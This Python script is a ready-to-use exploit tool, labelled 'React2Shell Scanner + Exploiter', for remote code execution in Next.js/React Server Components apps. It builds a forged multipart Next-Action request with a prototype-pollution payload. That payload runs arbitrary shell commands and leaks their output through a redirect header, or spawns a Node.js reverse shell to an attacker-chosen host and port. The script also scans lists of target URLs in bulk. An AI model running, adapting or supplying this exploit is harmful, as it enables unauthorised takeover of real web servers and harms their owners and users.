import requests
import uuid
import sys
import argparse
import json
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    GREY = '\033[90m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def normalize_url(url):
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        return f"https://{url}"
    return url

def get_payload(mode="scan", command="id", reverse_host=None):

    boundary_id = uuid.uuid4().hex[:16]
    boundary = f"----WebKitFormBoundary{boundary_id}"

    js_code = ""

 
    if mode == 'revershell':
        if not reverse_host:
            print(f"{Colors.RED}[!] Error: Host is missing for reverse shell.{Colors.RESET}")
            sys.exit(1)

      
        clean_host = reverse_host.replace("tcp://", "").replace("http://", "").replace("https://", "")
        try:
            if ":" in clean_host:
                r_host, r_port = clean_host.split(":")
            else:
                print(f"{Colors.RED}[!] Error: Port is missing. Format should be HOST:PORT{Colors.RESET}")
                sys.exit(1)
        except ValueError:
            print(f"{Colors.RED}[!] Error parsing host/port.{Colors.RESET}")
            sys.exit(1)


        js_code = (
            f"var net=process.mainModule.require('net');"
            f"var cp=process.mainModule.require('child_process');"
            f"var sh=cp.spawn('/bin/sh',[]);"
            f"var client=new net.Socket();"
            f"client.connect({r_port},'{r_host}',function(){{"
            f"client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);"
            f"}});"
        )
    

    else:
   
        js_code = (
            f"var res=process.mainModule.require('child_process').execSync('{command}').toString().trim().replace(/\\n/g, ' | ');"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )


    fake_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": js_code,
            "_formData": {
                "get": "$1:constructor:constructor"
            },
            "_chunks": "$Q2"
        }
    }

    payload_json = json.dumps(fake_chunk)

    payload = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{payload_json}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f'[]\r\n'
        f"--{boundary}--\r\n"
    )

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Next-Action": str(uuid.uuid4()),
        "X-Nextjs-Request-Id": str(uuid.uuid4()),
        "Next-Router-State-Tree": '[[["",{"children":["__PAGE__",{}]},null,null,true]]'
    }

    return headers, payload

def analyze_500_response(body):
    if 'E{"digest"' in body or ('digest' in body and 'Error' in body):
        return "VULNERABLE", "Confirmed React2Shell Signature found (Blind)!"
    if "Minified React error" in body:
        return "SUSPICIOUS", "React crashed (Minified), potentially Blind RCE."
    if "Microsoft" in body or "IIS" in body or "Azure" in body:
        return "GENERIC_IIS", "Generic Server Error (Likely IIS/Azure rejecting format)."
    if "Cloudflare" in body or "WAF" in body:
        return "WAF", "Blocked by WAF (500 Page)."
    return "UNKNOWN", "Generic 500 Error (No specific signature)."

def scan_target(url, command="id", reverse_host=None, verbose=False):
    target_url = normalize_url(url)
    
 
    mode = "revershell" if reverse_host else "scan"
    

    headers, payload = get_payload(mode, command, reverse_host)

    if mode == "revershell":
        print(f"{Colors.YELLOW}[*] ATTACKING: Sending Reverse Shell to {target_url}{Colors.RESET}")
        print(f"    CALLBACK: {reverse_host}")
    else:
        print(f"{Colors.BLUE}[*] Scanning: {target_url} (Cmd: {command}){Colors.RESET}")

    try:

        timeout_val = 5 if mode == "revershell" else 10
        
        response = requests.post(
            target_url,
            headers=headers,
            data=payload,
            verify=False,
            timeout=timeout_val 
        )

        if verbose:
            print(f"\n{Colors.MAGENTA}[VERBOSE] OUTGOING REQUEST:{Colors.RESET}")
            print(f"POST {target_url}")
            for k, v in headers.items():
                print(f"{k}: {v}")
            print("\n[Payload Content Hidden]")
            
            print(f"\n{Colors.CYAN}[VERBOSE] INCOMING RESPONSE:{Colors.RESET}")
            print(f"Status: {response.status_code}")
            print("\n" + response.text[:500] + "...")
            print("-" * 60 + "\n")



  
        if mode == "revershell":
           
            print(f"{Colors.GREEN}[+] Payload sent. Check your listener at {reverse_host}!{Colors.RESET}")
            return

   
        if 'X-Action-Redirect' in response.headers:
            redirect_val = response.headers['X-Action-Redirect']
            if '?a=' in redirect_val:
                raw_output = redirect_val.split('?a=')[1].split(';')[0]
                decoded_output = urllib.parse.unquote(raw_output)
                print(f"{Colors.GREEN}[!!!] VULNERABLE (REFLECTED): {target_url}{Colors.RESET}")
                print(f"{Colors.GREEN}      Command Output ('{command}'): {Colors.BOLD}{decoded_output}{Colors.RESET}")
                return 

    
        if response.status_code == 500:
            category, reason = analyze_500_response(response.text)
            if category == "VULNERABLE":
                print(f"{Colors.RED}[!] VULNERABLE (BLIND): {target_url}{Colors.RESET}")
                print(f"      Reason: {reason}")
            elif category == "SUSPICIOUS":
                print(f"{Colors.YELLOW}[?] SUSPICIOUS: {target_url}{Colors.RESET}")
                print(f"      Reason: {reason}")
            else:
                print(f"{Colors.GREEN}[-] SAFE (Generic 500): {target_url}{Colors.RESET}")
        elif response.status_code in [403, 406]:
            print(f"{Colors.YELLOW}[-] BLOCKED: {target_url} (WAF detected){Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[-] SAFE: {target_url} (Status: {response.status_code}){Colors.RESET}")

    except requests.exceptions.ReadTimeout:
        if mode == "revershell":
             print(f"{Colors.GREEN}[+] Connection Open! (Timeout triggered - Shell likely spawned){Colors.RESET}")
        else:
             print(f"{Colors.RED}[!] Timeout: Server did not respond.{Colors.RESET}")

    except Exception as e:
        print(f"{Colors.RED}[!] ERROR: {target_url} - {str(e)}{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description="React2Shell Advanced Tool (Scanner + Exploiter)")
    
 
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target a single URL")
    group.add_argument("-l", "--list", help="Path to text file with URLs")

    # Options
    parser.add_argument("-c", "--command", default="id", help="Command to execute for scanner (Default: id)")
    parser.add_argument("-revershell", help="Activate Reverse Shell mode. Format: HOST:PORT (e.g., 10.10.10.10:4444)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show full Request/Response details")

    args = parser.parse_args()

    if args.url:
        scan_target(args.url, args.command, args.revershell, args.verbose)
    elif args.list:
        try:
            with open(args.list, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                scan_target(url, args.command, args.revershell, args.verbose)
        except FileNotFoundError:
            print("File not found.")

if __name__ == "__main__":
    main()
   
